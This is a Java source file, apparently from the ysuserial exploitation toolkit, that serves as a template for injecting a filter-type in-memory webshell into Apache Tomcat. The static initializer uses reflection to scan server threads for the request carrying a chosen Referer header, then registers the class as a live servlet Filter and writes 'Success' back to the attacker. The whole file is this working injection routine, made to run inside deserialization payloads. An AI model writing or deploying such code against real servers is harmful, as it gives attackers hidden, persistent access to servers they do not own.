package org.su18.ysuserial.payloads.templates.memshell.tomcat;


import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.List;

/**
 * 遍历线程组，在 request 中查找带有特定 Referer 的请求，并从 request 获取 ServletContext 添加 Filter 型内存马
 * 添加成功后，会回显 Success 字样，参考 ShiroAttack2
 *
 * @author su18
 */
public class TFMSFromRequest implements Filter {

	public static HttpServletRequest request = null;

	public static HttpServletResponse response = null;

	public static String pattern;

	public static String referer;

	static {
		getRequestAndResponse();
		if (request != null && response != null) {
			addFilter();
		}
	}

	public static void getRequestAndResponse() {
		try {
			boolean  flag    = false;
			Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

			for (int i = 0; i < threads.length; ++i) {
				Thread thread = threads[i];
				if (thread != null) {
					String threadName = thread.getName();
					if (!threadName.contains("exec") && threadName.contains("http")) {
						Object target = getFieldValue(thread, "target");
						if (target instanceof Runnable) {
							try {
								target = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "global");
							} catch (Exception ignored) {
								continue;
							}

							List processors = (List) getFieldValue(target, "processors");

							for (int j = 0; j < processors.size(); ++j) {
								Object processor = processors.get(j);
								target = getFieldValue(processor, "req");
								Object req        = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
								String reqReferer = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String("Referer"));
								if (reqReferer != null && !reqReferer.isEmpty() && reqReferer.equals(referer)) {
									request = (HttpServletRequest) req;
									try {
										response = (HttpServletResponse) getFieldValue(getFieldValue(req, "request"), "response");
									} catch (Exception ignored) {
										try {
											response = (HttpServletResponse) req.getClass().getMethod("getResponse", (Class[]) null).invoke(req, (Object[]) null);
										} catch (Exception ignored2) {
										}
									}
									flag = true;
								}

								if (flag) {
									break;
								}
							}
						}
					}
				}
			}
		} catch (Exception ignored) {
		}
	}

	public static Object getFieldValue(Object obj, String fieldName) throws Exception {
		java.lang.reflect.Field f = null;
		if (obj instanceof java.lang.reflect.Field) {
			f = (java.lang.reflect.Field) obj;
		} else {
			Class cs = obj.getClass();
			while (cs != null) {
				try {
					f = cs.getDeclaredField(fieldName);
					cs = null;
				} catch (Exception e) {
					cs = cs.getSuperclass();
				}
			}
		}
		f.setAccessible(true);
		return f.get(obj);
	}


	public static void addFilter() {
		ServletContext servletContext = request.getServletContext();
		Filter         filter         = new TFMSFromRequest();
		String         filterName     = filter.getClass().getName();

		try {
			Object  standardContext = getFieldValue(getFieldValue(servletContext, "context"), "context");
			HashMap map             = (HashMap) getFieldValue(standardContext, "filterConfigs");

			if (map.get(filterName) == null) {
				Class filterDefClass = null;
				try {
					filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
				} catch (ClassNotFoundException e) {
					filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
				}

				Object filterDef = filterDefClass.newInstance();
				filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
				filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
				filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
				standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);

				Class filterMapClass = null;
				try {
					filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
				} catch (ClassNotFoundException e) {
					filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
				}

				Object filterMap = filterMapClass.newInstance();
				filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
				filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
				filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, pattern);
				standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
				Class       filterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
				Class       contextClass      = Class.forName("org.apache.catalina.Context");
				Constructor constructor       = filterConfigClass.getDeclaredConstructor(contextClass, filterDefClass);
				constructor.setAccessible(true);
				Object filterConfig = constructor.newInstance(new Object[]{standardContext, filterDef});
				map.put(filterName, filterConfig);

				writeResponse("Success");
			} else {
				writeResponse("Filter already exists");
			}
		} catch (Exception ignored) {
		}
	}

	public static void writeResponse(String result) {
		try {
			response.setContentType("text/html");
			request.setCharacterEncoding("UTF-8");
			response.setCharacterEncoding("UTF-8");
			response.getWriter().print(result);
			response.getWriter().flush();
			response.getWriter().close();
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(FilterConfig filterConfig) throws ServletException {
	}

	@Override
	public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
	}

	@Override
	public void destroy() {
	}
}
